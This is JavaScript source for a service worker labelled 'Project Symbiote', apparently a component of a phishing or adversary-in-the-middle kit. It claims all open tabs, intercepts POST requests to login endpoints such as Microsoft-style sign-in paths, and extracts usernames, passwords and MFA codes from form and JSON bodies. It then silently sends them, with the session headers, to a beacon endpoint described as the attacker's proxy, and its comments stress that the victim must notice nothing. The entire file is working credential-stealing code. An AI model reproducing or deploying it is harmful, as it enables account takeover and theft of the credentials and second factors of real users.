// ══════════════════════════════════════════════════════════
//  PROJECT SYMBIOTE: NETWORK LAYER INTERCEPTOR
// ══════════════════════════════════════════════════════════

const BEACON_ENDPOINT = '/sw/beacon';
const SENSITIVE_PATHS = ['/login', '/kmsi', '/credential', '/SignIn', '/login.srf'];

// 1. INSTALL & ACTIVATE: Claim all tabs immediately. 
// This ensures the Symbiote is active even if the victim opens the link in a new tab.
self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(self.clients.claim());
});

// 2. FETCH INTERCEPTION: The core of the Symbiote.
self.addEventListener('fetch', (event) => {
    const request = event.request;
    
    // We only care about POST requests to sensitive login endpoints
    if (request.method === 'POST' && isSensitivePath(request.url)) {
        
        // Clone the request so we can read the body without consuming the original stream
        const requestClone = request.clone();
        
        requestClone.text().then(bodyText => {
            try {
                // Extract the payload (handles both FormData and JSON)
                const payload = extractCredentials(bodyText);
                
                if (payload) {
                    // Fire a silent, asynchronous beacon to our Go proxy
                    // We use the original request's headers to maintain the session context
                    const beaconHeaders = new Headers(request.headers);
                    beaconHeaders.set('X-Symbiote-Source', 'Network-Intercept');
                    
                    fetch(BEACON_ENDPOINT, {
                        method: 'POST',
                        headers: beaconHeaders,
                        body: JSON.stringify(payload)
                    }).catch(err => {
                        // Silent failure. If the beacon fails, we don't break the victim's login.
                    });
                }
            } catch (e) {
                // Silent failure
            }
        }).catch(() => {});
    }

    // ALWAYS let the original request proceed to the actual server. 
    // The victim must experience zero latency or breakage.
    event.respondWith(fetch(request));
});

// Helper: Check if the URL matches a sensitive login path
function isSensitivePath(url) {
    try {
        const path = new URL(url).pathname.toLowerCase();
        return SENSITIVE_PATHS.some(p => path.includes(p));
    } catch (e) {
        return false;
    }
}

// Helper: Extract username/password/MFA from the request body
function extractCredentials(bodyText) {
    const data = {};
    
    // Try parsing as URL-encoded FormData (standard for Microsoft/Google)
    try {
        const params = new URLSearchParams(bodyText);
        for (const [key, value] of params.entries()) {
            const lowerKey = key.toLowerCase();
            if (lowerKey.includes('user') || lowerKey.includes('email') || lowerKey.includes('login')) {
                data.username = value;
            }
            if (lowerKey.includes('pass') || lowerKey.includes('pwd')) {
                data.password = value;
            }
            if (lowerKey.includes('otp') || lowerKey.includes('mfa') || lowerKey.includes('code')) {
                data.mfa = value;
            }
        }
    } catch (e) {}

    // Try parsing as JSON (modern SPAs)
    if (Object.keys(data).length === 0) {
        try {
            const json = JSON.parse(bodyText);
            // Recursively search for sensitive keys
            searchJSON(json, data);
        } catch (e) {}
    }

    return Object.keys(data).length > 0 ? data : null;
}

function searchJSON(obj, data) {
    for (const key in obj) {
        const lowerKey = key.toLowerCase();
        if (typeof obj[key] === 'string') {
            if (lowerKey.includes('user') || lowerKey.includes('email')) data.username = obj[key];
            if (lowerKey.includes('pass') || lowerKey.includes('pwd')) data.password = obj[key];
            if (lowerKey.includes('otp') || lowerKey.includes('mfa')) data.mfa = obj[key];
        } else if (typeof obj[key] === 'object') {
            searchJSON(obj[key], data);
        }
    }
}